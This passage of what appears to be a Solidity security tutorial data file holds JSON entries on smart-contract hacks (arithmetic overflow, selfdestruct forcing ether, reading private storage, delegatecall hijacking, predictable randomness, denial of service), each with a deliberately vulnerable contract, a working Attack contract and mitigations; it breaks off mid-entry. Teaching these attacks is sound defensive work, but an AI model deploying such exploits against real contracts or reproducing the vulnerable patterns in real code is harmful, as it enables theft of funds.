AMOUNT}();\n        etherStore.withdraw();\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n"
      },
      {
        "fileName": "ReEntrancyGuard.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ReEntrancyGuard {\n    bool internal locked;\n\n    modifier noReentrant() {\n        require(!locked, \"No re-entrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "re-entrancy"
    ],
    "order": 0
  },
  {
    "slug": "overflow",
    "title": "Arithmetic Overflow and Underflow",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of hacking Solidity with arithmetic overflow / underflow",
    "content": "### Vulnerability\n\n##### Solidity < 0.8\n\nIntegers in Solidity overflow / underflow without any errors\n\n##### Solidity >= 0.8\n\nDefault behaviour of Solidity 0.8 for overflow / underflow is to throw an error.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n\n// This contract is designed to act as a time vault.\n// User can deposit into this contract but cannot withdraw for at least a week.\n// User can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Deploy TimeLock\n2. Deploy Attack with address of TimeLock\n3. Call Attack.attack sending 1 ether. You will immediately be able to\n   withdraw your ether.\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow and was able to withdraw\nbefore the 1 week waiting period.\n*/\n\ncontract TimeLock {\n    mapping(address => uint256) public balances;\n    mapping(address => uint256) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint256 _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease;\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(block.timestamp > lockTime[msg.sender], \"Lock time not expired\");\n\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent,) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    TimeLock timeLock;\n\n    constructor(TimeLock _timeLock) {\n        timeLock = TimeLock(_timeLock);\n    }\n\n    fallback() external payable {}\n\n    function attack() public payable {\n        timeLock.deposit{value: msg.value}();\n        /*\n        if t = current lock time then we need to find x such that\n        x + t = 2**256 = 0\n        so x = -t\n        2**256 = type(uint).max + 1\n        so x = type(uint).max + 1 - t\n        */\n        timeLock.increaseLockTime(\n            type(uint256).max + 1 - timeLock.lockTime(address(this))\n        );\n        timeLock.withdraw();\n    }\n}\n\n```\n\n### Preventative Techniques\n\n- Use <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.3/contracts/utils/math/SafeMath.sol\" target=\"__blank\">SafeMath</a> to will prevent arithmetic overflow and underflow\n\n- Solidity 0.8 defaults to throwing an error for overflow / underflow",
    "codes": [
      {
        "fileName": "Overflow.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n\n// This contract is designed to act as a time vault.\n// User can deposit into this contract but cannot withdraw for at least a week.\n// User can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Deploy TimeLock\n2. Deploy Attack with address of TimeLock\n3. Call Attack.attack sending 1 ether. You will immediately be able to\n   withdraw your ether.\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow and was able to withdraw\nbefore the 1 week waiting period.\n*/\n\ncontract TimeLock {\n    mapping(address => uint256) public balances;\n    mapping(address => uint256) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint256 _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease;\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(block.timestamp > lockTime[msg.sender], \"Lock time not expired\");\n\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent,) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    TimeLock timeLock;\n\n    constructor(TimeLock _timeLock) {\n        timeLock = TimeLock(_timeLock);\n    }\n\n    fallback() external payable {}\n\n    function attack() public payable {\n        timeLock.deposit{value: msg.value}();\n        /*\n        if t = current lock time then we need to find x such that\n        x + t = 2**256 = 0\n        so x = -t\n        2**256 = type(uint).max + 1\n        so x = type(uint).max + 1 - t\n        */\n        timeLock.increaseLockTime(\n            type(uint256).max + 1 - timeLock.lockTime(address(this))\n        );\n        timeLock.withdraw();\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "arithmetic",
      "overflow",
      "underflow"
    ],
    "order": 1
  },
  {
    "slug": "self-destruct",
    "title": "Self Destruct",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of how to delete your smart contract by calling selfdestruct in Solidity",
    "content": "Contracts can be deleted from the blockchain by calling `selfdestruct`.\n\n`selfdestruct` sends all remaining Ether stored in the contract to a\ndesignated address.\n\n### Vulnerability\n\nA malicious contract can use `selfdestruct` to\nforce sending Ether to any contract.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// The goal of this game is to be the 7th player to deposit 1 Ether.\n// Players can deposit only 1 Ether at a time.\n// Winner will be able to withdraw all Ether.\n\n/*\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game\n   No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\n*/\n\ncontract EtherGame {\n    uint256 public constant TARGET_AMOUNT = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        uint256 balance = address(this).balance;\n        require(balance <= TARGET_AMOUNT, \"Game is over\");\n\n        if (balance == TARGET_AMOUNT) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n\n        (bool sent,) = msg.sender.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function attack() public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance >= 7 ether\n\n        // cast address to payable\n        address payable addr = payable(address(etherGame));\n        selfdestruct(addr);\n    }\n}\n\n```\n\n### Preventative Techniques\n\nDon't rely on `address(this).balance`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract EtherGame {\n    uint256 public constant TARGET_AMOUNT = 7 ether;\n    uint256 public balance;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        balance += msg.value;\n        require(balance <= TARGET_AMOUNT, \"Game is over\");\n\n        if (balance == TARGET_AMOUNT) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n        uint256 amount = balance;\n        balance = 0;\n        (bool sent,) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ForceEther.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// The goal of this game is to be the 7th player to deposit 1 Ether.\n// Players can deposit only 1 Ether at a time.\n// Winner will be able to withdraw all Ether.\n\n/*\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game\n   No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\n*/\n\ncontract EtherGame {\n    uint256 public constant TARGET_AMOUNT = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        uint256 balance = address(this).balance;\n        require(balance <= TARGET_AMOUNT, \"Game is over\");\n\n        if (balance == TARGET_AMOUNT) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n\n        (bool sent,) = msg.sender.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function attack() public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance >= 7 ether\n\n        // cast address to payable\n        address payable addr = payable(address(etherGame));\n        selfdestruct(addr);\n    }\n}\n"
      },
      {
        "fileName": "PreventForceEther.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract EtherGame {\n    uint256 public constant TARGET_AMOUNT = 7 ether;\n    uint256 public balance;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        balance += msg.value;\n        require(balance <= TARGET_AMOUNT, \"Game is over\");\n\n        if (balance == TARGET_AMOUNT) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n        uint256 amount = balance;\n        balance = 0;\n        (bool sent,) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "selfdestruct"
    ],
    "order": 2
  },
  {
    "slug": "accessing-private-data",
    "title": "Accessing Private Data",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of accessing private data from a Solidity smart contract",
    "content": "### Vulnerability\n\nAll data on a smart contract can be read.\n\nLet's see how we can read `private` data. In the process you will learn how Solidity stores state variables.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nNote: cannot use web3 on JVM, so use the contract deployed on Goerli\nNote: browser Web3 is old so use Web3 from truffle console\n\nContract deployed on Goerli\n0x534E4Ce0ffF779513793cfd70308AF195827BD31\n*/\n\n/*\n# Storage\n- 2 ** 256 slots\n- 32 bytes for each slot\n- data is stored sequentially in the order of declaration\n- storage is optimized to save space. If neighboring variables fit in a single\n  32 bytes, then they are packed into the same slot, starting from the right\n*/\n\ncontract Vault {\n    // slot 0\n    uint256 public count = 123;\n    // slot 1\n    address public owner = msg.sender;\n    bool public isTrue = true;\n    uint16 public u16 = 31;\n    // slot 2\n    bytes32 private password;\n\n    // constants do not use storage\n    uint256 public constant someConst = 123;\n\n    // slot 3, 4, 5 (one for each array element)\n    bytes32[3] public data;\n\n    struct User {\n        uint256 id;\n        bytes32 password;\n    }\n\n    // slot 6 - length of array\n    // starting from slot hash(6) - array elements\n    // slot where array element is stored = keccak256(slot)) + (index * elementSize)\n    // where slot = 6 and elementSize = 2 (1 (uint) +  1 (bytes32))\n    User[] private users;\n\n    // slot 7 - empty\n    // entries are stored at hash(key, slot)\n    // where slot = 7, key = map key\n    mapping(uint256 => User) private idToUser;\n\n    constructor(bytes32 _password) {\n        password = _password;\n    }\n\n    function addUser(bytes32 _password) public {\n        User memory user = User({id: users.length, password: _password});\n\n        users.push(user);\n        idToUser[user.id] = user;\n    }\n\n    function getArrayLocation(uint256 slot, uint256 index, uint256 elementSize)\n        public\n        pure\n        returns (uint256)\n    {\n        return\n            uint256(keccak256(abi.encodePacked(slot))) + (index * elementSize);\n    }\n\n    function getMapLocation(uint256 slot, uint256 key)\n        public\n        pure\n        returns (uint256)\n    {\n        return uint256(keccak256(abi.encodePacked(key, slot)));\n    }\n}\n\n/*\nslot 0 - count\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", 0, console.log)\nslot 1 - u16, isTrue, owner\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", 1, console.log)\nslot 2 - password\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", 2, console.log)\n\nslot 6 - array length\ngetArrayLocation(6, 0, 2)\nweb3.utils.numberToHex(\"111414077815863400510004064629973595961579173665589224203503662149373724986687\")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: \"uint\", value: 6 })\n1st user\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f\", console.log)\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40\", console.log)\nNote: use web3.toAscii to convert bytes32 to alphabet\n2nd user\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41\", console.log)\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d42\", console.log)\n\nslot 7 - empty\ngetMapLocation(7, 1)\nweb3.utils.numberToHex(\"81222191986226809103279119994707868322855741819905904417953092666699096963112\")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: \"uint\", value: 1 }, {type: \"uint\", value: 7})\nuser 1\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828\", console.log)\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b829\", console.log)\n*/\n\n```\n\n### Preventative Techniques\n\n- Don't store sensitive information on the blockchain.",
    "codes": [
      {
        "fileName": "Vault.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nNote: cannot use web3 on JVM, so use the contract deployed on Goerli\nNote: browser Web3 is old so use Web3 from truffle console\n\nContract deployed on Goerli\n0x534E4Ce0ffF779513793cfd70308AF195827BD31\n*/\n\n/*\n# Storage\n- 2 ** 256 slots\n- 32 bytes for each slot\n- data is stored sequentially in the order of declaration\n- storage is optimized to save space. If neighboring variables fit in a single\n  32 bytes, then they are packed into the same slot, starting from the right\n*/\n\ncontract Vault {\n    // slot 0\n    uint256 public count = 123;\n    // slot 1\n    address public owner = msg.sender;\n    bool public isTrue = true;\n    uint16 public u16 = 31;\n    // slot 2\n    bytes32 private password;\n\n    // constants do not use storage\n    uint256 public constant someConst = 123;\n\n    // slot 3, 4, 5 (one for each array element)\n    bytes32[3] public data;\n\n    struct User {\n        uint256 id;\n        bytes32 password;\n    }\n\n    // slot 6 - length of array\n    // starting from slot hash(6) - array elements\n    // slot where array element is stored = keccak256(slot)) + (index * elementSize)\n    // where slot = 6 and elementSize = 2 (1 (uint) +  1 (bytes32))\n    User[] private users;\n\n    // slot 7 - empty\n    // entries are stored at hash(key, slot)\n    // where slot = 7, key = map key\n    mapping(uint256 => User) private idToUser;\n\n    constructor(bytes32 _password) {\n        password = _password;\n    }\n\n    function addUser(bytes32 _password) public {\n        User memory user = User({id: users.length, password: _password});\n\n        users.push(user);\n        idToUser[user.id] = user;\n    }\n\n    function getArrayLocation(uint256 slot, uint256 index, uint256 elementSize)\n        public\n        pure\n        returns (uint256)\n    {\n        return\n            uint256(keccak256(abi.encodePacked(slot))) + (index * elementSize);\n    }\n\n    function getMapLocation(uint256 slot, uint256 key)\n        public\n        pure\n        returns (uint256)\n    {\n        return uint256(keccak256(abi.encodePacked(key, slot)));\n    }\n}\n\n/*\nslot 0 - count\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", 0, console.log)\nslot 1 - u16, isTrue, owner\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", 1, console.log)\nslot 2 - password\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", 2, console.log)\n\nslot 6 - array length\ngetArrayLocation(6, 0, 2)\nweb3.utils.numberToHex(\"111414077815863400510004064629973595961579173665589224203503662149373724986687\")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: \"uint\", value: 6 })\n1st user\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f\", console.log)\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40\", console.log)\nNote: use web3.toAscii to convert bytes32 to alphabet\n2nd user\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41\", console.log)\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d42\", console.log)\n\nslot 7 - empty\ngetMapLocation(7, 1)\nweb3.utils.numberToHex(\"81222191986226809103279119994707868322855741819905904417953092666699096963112\")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: \"uint\", value: 1 }, {type: \"uint\", value: 7})\nuser 1\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828\", console.log)\nweb3.eth.getStorageAt(\"0x534E4Ce0ffF779513793cfd70308AF195827BD31\", \"0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b829\", console.log)\n*/\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "access",
      "accessing",
      "private",
      "data",
      "storage"
    ],
    "order": 3
  },
  {
    "slug": "delegatecall",
    "title": "Delegatecall",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of exploits using delegatecall in Solidity",
    "content": "### Vulnerability\n\n`delegatecall` is tricky to use and wrong usage or incorrect understanding\ncan lead to devastating results.\n\nYou must keep 2 things in mind when using `delegatecall`\n\n1. `delegatecall` preserves context (storage, caller, etc...)\n2. storage layout must be the same for the contract calling `delegatecall` and the contract getting called\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nHackMe is a contract that uses delegatecall to execute code.\nIt is not obvious that the owner of HackMe can be changed since there is no\nfunction inside HackMe to do so. However an attacker can hijack the\ncontract by exploiting delegatecall. Let's see how.\n\n1. Alice deploys Lib\n2. Alice deploys HackMe with address of Lib\n3. Eve deploys Attack with address of HackMe\n4. Eve calls Attack.attack()\n5. Attack is now the owner of HackMe\n\nWhat happened?\nEve called Attack.attack().\nAttack called the fallback function of HackMe sending the function\nselector of pwn(). HackMe forwards the call to Lib using delegatecall.\nHere msg.data contains the function selector of pwn().\nThis tells Solidity to call the function pwn() inside Lib.\nThe function pwn() updates the owner to msg.sender.\nDelegatecall runs the code of Lib using the context of HackMe.\nTherefore HackMe's storage was updated to msg.sender where msg.sender is the\ncaller of HackMe, in this case Attack.\n*/\n\ncontract Lib {\n    address public owner;\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract HackMe {\n    address public owner;\n    Lib public lib;\n\n    constructor(Lib _lib) {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n\n    fallback() external payable {\n        address(lib).delegatecall(msg.data);\n    }\n}\n\ncontract Attack {\n    address public hackMe;\n\n    constructor(address _hackMe) {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        hackMe.call(abi.encodeWithSignature(\"pwn()\"));\n    }\n}\n\n```\n\nHere is another example.\n\nYou will need to understand how Solidity stores\nstate variables before you can understand this exploit.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nThis is a more sophisticated version of the previous exploit.\n\n1. Alice deploys Lib and HackMe with the address of Lib\n2. Eve deploys Attack with the address of HackMe\n3. Eve calls Attack.attack()\n4. Attack is now the owner of HackMe\n\nWhat happened?\nNotice that the state variables are not defined in the same manner in Lib\nand HackMe. This means that calling Lib.doSomething() will change the first\nstate variable inside HackMe, which happens to be the address of lib.\n\nInside attack(), the first call to doSomething() changes the address of lib\nstore in HackMe. Address of lib is now set to Attack.\nThe second call to doSomething() calls Attack.doSomething() and here we\nchange the owner.\n*/\n\ncontract Lib {\n    uint256 public someNumber;\n\n    function doSomething(uint256 _num) public {\n        someNumber = _num;\n    }\n}\n\ncontract HackMe {\n    address public lib;\n    address public owner;\n    uint256 public someNumber;\n\n    constructor(address _lib) {\n        lib = _lib;\n        owner = msg.sender;\n    }\n\n    function doSomething(uint256 _num) public {\n        lib.delegatecall(abi.encodeWithSignature(\"doSomething(uint256)\", _num));\n    }\n}\n\ncontract Attack {\n    // Make sure the storage layout is the same as HackMe\n    // This will allow us to correctly update the state variables\n    address public lib;\n    address public owner;\n    uint256 public someNumber;\n\n    HackMe public hackMe;\n\n    constructor(HackMe _hackMe) {\n        hackMe = HackMe(_hackMe);\n    }\n\n    function attack() public {\n        // override address of lib\n        hackMe.doSomething(uint256(uint160(address(this))));\n        // pass any number as input, the function doSomething() below will\n        // be called\n        hackMe.doSomething(1);\n    }\n\n    // function signature must match HackMe.doSomething()\n    function doSomething(uint256 _num) public {\n        owner = msg.sender;\n    }\n}\n\n```\n\n### Preventative Techniques\n\n- Use stateless `Library`",
    "codes": [
      {
        "fileName": "Delegatecall_1.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nHackMe is a contract that uses delegatecall to execute code.\nIt is not obvious that the owner of HackMe can be changed since there is no\nfunction inside HackMe to do so. However an attacker can hijack the\ncontract by exploiting delegatecall. Let's see how.\n\n1. Alice deploys Lib\n2. Alice deploys HackMe with address of Lib\n3. Eve deploys Attack with address of HackMe\n4. Eve calls Attack.attack()\n5. Attack is now the owner of HackMe\n\nWhat happened?\nEve called Attack.attack().\nAttack called the fallback function of HackMe sending the function\nselector of pwn(). HackMe forwards the call to Lib using delegatecall.\nHere msg.data contains the function selector of pwn().\nThis tells Solidity to call the function pwn() inside Lib.\nThe function pwn() updates the owner to msg.sender.\nDelegatecall runs the code of Lib using the context of HackMe.\nTherefore HackMe's storage was updated to msg.sender where msg.sender is the\ncaller of HackMe, in this case Attack.\n*/\n\ncontract Lib {\n    address public owner;\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract HackMe {\n    address public owner;\n    Lib public lib;\n\n    constructor(Lib _lib) {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n\n    fallback() external payable {\n        address(lib).delegatecall(msg.data);\n    }\n}\n\ncontract Attack {\n    address public hackMe;\n\n    constructor(address _hackMe) {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        hackMe.call(abi.encodeWithSignature(\"pwn()\"));\n    }\n}\n"
      },
      {
        "fileName": "Delegatecall_2.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nThis is a more sophisticated version of the previous exploit.\n\n1. Alice deploys Lib and HackMe with the address of Lib\n2. Eve deploys Attack with the address of HackMe\n3. Eve calls Attack.attack()\n4. Attack is now the owner of HackMe\n\nWhat happened?\nNotice that the state variables are not defined in the same manner in Lib\nand HackMe. This means that calling Lib.doSomething() will change the first\nstate variable inside HackMe, which happens to be the address of lib.\n\nInside attack(), the first call to doSomething() changes the address of lib\nstore in HackMe. Address of lib is now set to Attack.\nThe second call to doSomething() calls Attack.doSomething() and here we\nchange the owner.\n*/\n\ncontract Lib {\n    uint256 public someNumber;\n\n    function doSomething(uint256 _num) public {\n        someNumber = _num;\n    }\n}\n\ncontract HackMe {\n    address public lib;\n    address public owner;\n    uint256 public someNumber;\n\n    constructor(address _lib) {\n        lib = _lib;\n        owner = msg.sender;\n    }\n\n    function doSomething(uint256 _num) public {\n        lib.delegatecall(abi.encodeWithSignature(\"doSomething(uint256)\", _num));\n    }\n}\n\ncontract Attack {\n    // Make sure the storage layout is the same as HackMe\n    // This will allow us to correctly update the state variables\n    address public lib;\n    address public owner;\n    uint256 public someNumber;\n\n    HackMe public hackMe;\n\n    constructor(HackMe _hackMe) {\n        hackMe = HackMe(_hackMe);\n    }\n\n    function attack() public {\n        // override address of lib\n        hackMe.doSomething(uint256(uint160(address(this))));\n        // pass any number as input, the function doSomething() below will\n        // be called\n        hackMe.doSomething(1);\n    }\n\n    // function signature must match HackMe.doSomething()\n    function doSomething(uint256 _num) public {\n        owner = msg.sender;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "delegatecall"
    ],
    "order": 4
  },
  {
    "slug": "randomness",
    "title": "Source of Randomness",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "Blockchain is not a reliable source of randomness in Solidity",
    "content": "### Vulnerability\n\n`blockhash` and `block.timestamp` are not reliable sources for randomness.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nNOTE: cannot use blockhash in Remix so use ganache-cli\n\nnpm i -g ganache-cli\nganache-cli\nIn remix switch environment to Web3 provider\n*/\n\n/*\nGuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let's see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.\n*/\n\ncontract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint256 _guess) public {\n        uint256 answer = uint256(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        if (_guess == answer) {\n            (bool sent,) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n}\n\ncontract Attack {\n    receive() external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n        uint256 answer = uint256(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    // Helper function to check balance\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n```\n\n### Preventative Techniques\n\n- Don't use `blockhash` and `block.timestamp` as source of randomness",
    "codes": [
      {
        "fileName": "Randomness.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nNOTE: cannot use blockhash in Remix so use ganache-cli\n\nnpm i -g ganache-cli\nganache-cli\nIn remix switch environment to Web3 provider\n*/\n\n/*\nGuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let's see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.\n*/\n\ncontract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint256 _guess) public {\n        uint256 answer = uint256(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        if (_guess == answer) {\n            (bool sent,) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n}\n\ncontract Attack {\n    receive() external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n        uint256 answer = uint256(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    // Helper function to check balance\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "source",
      "random",
      "randomness",
      "blockhash",
      "block",
      "timestamp"
    ],
    "order": 5
  },
  {
    "slug": "denial-of-service",
    "title": "Denial of Service",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of denial of service hack in Solidity",
    "content": "### Vulnerability\n\nThere are many ways to attack a smart contract to make it unusable.\n\nOne exploit we introduce here is denial of service by making the function to send Ether fail.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nThe goal of KingOfEther is to become the king by sending more Ether than\nthe previous king. Previous king will be refunded with the amount of Ether\nhe sent.\n*/\n\n/*\n1. Deploy KingOfEther\n2. Alice becomes the king by sending 1 Ether to claimThrone().\n3. Bob becomes the king by sending 2 Ether to claimThrone().\n   Alice receives a refund of 1 Ether.\n4. Deploy Attack with address of KingOfEther.\n5. Call attack with 3 Ether.\n6. Current king is the Attack contract and no one can become the new king.\n\nWhat happened?\nAttack became the king. All new challenge to claim the throne will be rejected\nsince Attack contract does not have a fallback function, denying to accept the\nEther sent from KingOfEther before the new king is set.\n*/\n\ncontract KingOfEther {\n    address public king;\n    uint256 public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent,) = king.call{value: 